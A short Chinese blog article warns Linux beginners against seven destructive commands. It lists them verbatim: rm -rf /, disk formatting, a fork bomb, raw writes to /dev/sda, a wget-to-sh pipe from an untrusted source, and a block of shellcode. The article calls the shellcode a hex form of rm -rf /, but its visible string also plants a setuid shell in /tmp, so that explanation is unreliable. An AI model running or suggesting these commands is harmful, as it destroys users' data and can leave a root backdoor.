# 7 个致命的 Linux 命令

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzkwODM4NDM5OA==&mid=2247504132&idx=1&sn=1a09b3a4f6f72110935c86d0af4358c1&chksm=c0c850e5f7bfd9f33f1f96de9e3c564ee52a0d03fa7a706c3f4cbc03d58d0a4326e9c640608e&scene=126&sessionid=1681309759#rd](http://mp.weixin.qq.com/s?__biz=MzkwODM4NDM5OA==&mid=2247504132&idx=1&sn=1a09b3a4f6f72110935c86d0af4358c1&chksm=c0c850e5f7bfd9f33f1f96de9e3c564ee52a0d03fa7a706c3f4cbc03d58d0a4326e9c640608e&scene=126&sessionid=1681309759#rd)

如果你是一个 Linux 新手，在好奇心的驱使下，可能会去尝试从各个渠道获得的命令。

  

以下是 7 个致命的 Linux 命令，轻则使你的数据造成丢失，重则使你的系统造成瘫痪，所以，你应当竭力避免在系统中运行它们。

  

![](../Images/c7ed6e5b3a06b01842754a5f29560af7.png)  

  

01

**rm -rf /**

  

此命令将递归并强制删除 / 目录下的所有文件。

  

02

**char esp\[\] \_\_attribute\_\_ ((section(".text")))**

  

> ```
>  /\* e.s.p release \*/
>     = "\\xeb\\x3e\\x5b\\x31\\xc0\\x50\\x54\\x5a\\x83\\xec\\x64\\x68"
>     "\\xff\\xff\\xff\\xff\\x68\\xdf\\xd0\\xdf\\xd9\\x68\\x8d\\x99"
>     "\\xdf\\x81\\x68\\x8d\\x92\\xdf\\xd2\\x54\\x5e\\xf7\\x16\\xf7"
>     "\\x56\\x04\\xf7\\x56\\x08\\xf7\\x56\\x0c\\x83\\xc4\\x74\\x56"
>     "\\x8d\\x73\\x08\\x56\\x53\\x54\\x59\\xb0\\x0b\\xcd\\x80\\x31"
>     "\\xc0\\x40\\xeb\\xf9\\xe8\\xbd\\xff\\xff\\xff\\x2f\\x62\\x69"
>     "\\x6e\\x2f\\x73\\x68\\x00\\x2d\\x63\\x00"
>     "cp -p /bin/sh /tmp/.beyond; chmod 4755
>     /tmp/.beyond;";
> ```

  

这是 rm -rf / 的 hex（十六进制）版本，很能迷惑 Linux 用户。

  

03

**mkfs.ext3 /dev/sda**

  

这将对硬盘进行重新格式化，自然，硬盘上的所有数据将灰飞烟灭。

  

04

**:(){ :|:& };:**

  

著名的 fork 炸弹，此命令将告诉你的系统执行海量的进程，直到你的系统僵死。

  

05

**any\_command > /dev/sda**

  

使用该命令，原始数据将被写到块设备，其结果是造成数据丢失。

  

06

**wget http://some\_untrusted\_source -O- | sh**

  

不要从不信任的地方下载东西，这可能会获取恶意代码。

  

07

**mv /home/yourhomedirectory/\* /dev/null**

  

此命令将移动主目录中的所有文件到一个不存在的地方，你将再也看不到那些文件。
